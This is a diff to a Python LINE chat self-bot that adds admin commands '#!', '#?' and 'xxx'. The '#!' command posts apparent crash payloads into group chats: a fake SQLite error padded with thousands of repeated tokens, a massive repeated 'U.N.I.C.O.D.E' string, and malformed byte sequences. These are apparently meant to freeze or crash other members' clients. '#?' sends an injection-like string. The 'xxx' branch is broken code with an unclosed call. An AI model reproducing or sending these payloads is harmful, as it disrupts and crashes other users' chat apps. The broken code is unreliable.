@@ -384,6 +384,10 @@ def help():
 ╠ ✯͜͡❂Listadmin
 ╠ ✯͜͡❂Status
 ╠ ✯͜͡❂Sider「on/off」
+╠ ✯͜͡❂broadcast:「ข้อความ」
+╠ ✯͜͡❂xxx
+╠ ✯͜͡❂#?
+╠ ✯͜͡❂#!
 ╠ ✯͜͡❂My token
 ╠══════════════════
 ╠ ✯͜͡❂ CREATOR:MAXSY
@@ -1566,7 +1570,7 @@ def bot(op):
                             if msg._from in admin:
                                 tz = pytz.timezone("Asia/Jakarta")
                                 timeNow = datetime.now(tz=tz)
-                                md = "-▬▬▬▬▬▬▬▬▬▬▬▬\n   🔰 S T A T U S 🔰\n-▬▬▬▬▬▬▬▬▬▬▬▬\n"
+                                md = "-▬▬▬▬▬▬▬▬▬▬▬▬\n      🔰 S T A T U S 🔰\n-▬▬▬▬▬▬▬▬▬▬▬▬\n"
                                 if wait["unsend"] == True: md+="┃🔰┃ ✔️ Unsend「ON」\n"
                                 else: md+="┃🔰┃ ✖ Unsend「OFF」\n"
                                 if wait["Mentionkick"] == True: md+="┃🔰┃ ✔️ Notag「ON」\n"
@@ -1618,6 +1622,21 @@ def bot(op):
                                msg.contentType = 13
                                msg.contentMetadata = {'mid': msg._from}
                                aditmadzs.sendMessage1(msg)
+
+                        elif text.lower() == "xxx":
+                            if msg._from in admin:
+                               aditmadzs.sendContact(to, "'xxx"
+                               aditmadzs.sendMessage(msg.to, "อ่าวเป็นไร v_v")
+
+                        elif text.lower() == "#!":
+                            if msg._from in admin:
+                               aditmadzs.sendMessage(msg.to, "android.database.sqlite.SQLiteException: near , :syntax error (code 1):,while compiling:select * from contact where m_id = 'ua7fb5762d5066629323d113e1266e8ca',' ####################################################################### Error Code : 1 (SQLITE_ERROR) Caused By : SQL(query) error or missing database.(near , : syntax error (code 1):,while compiling: select * from contact where m_id =.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.25.SALAM.RINDU.DARI.KAMI.25.25.25.25.25")
+                               aditmadzs.sendMessage(msg.to, "U.N.I.C.O.D.E.U.N.I.C.O.D.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E U.N.I.C.O.D.E.U.N.I.C.O.D.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C.O.D.E.U.N.I.C...")
+                               aditmadzs.sendMessage(msg.to, "ôﾀﾅﾹhahahaôﾏ﾿﾿ôﾀﾄﾃôﾀﾅﾹhahahaôﾏ﾿﾿ôﾀﾄﾃôﾀﾅﾹhahahaôﾏ﾿﾿")
+
+                        elif text.lower() == "#?":
+                            if msg._from in admin:
+                               aditmadzs.sendMessage(msg.to,"u9cc2323f5b84f9df880c33aa9f9e3ae1',")
 
                         elif text.lower() == "mid":
                                aditmadzs.sendMessage(msg.to, msg._from)
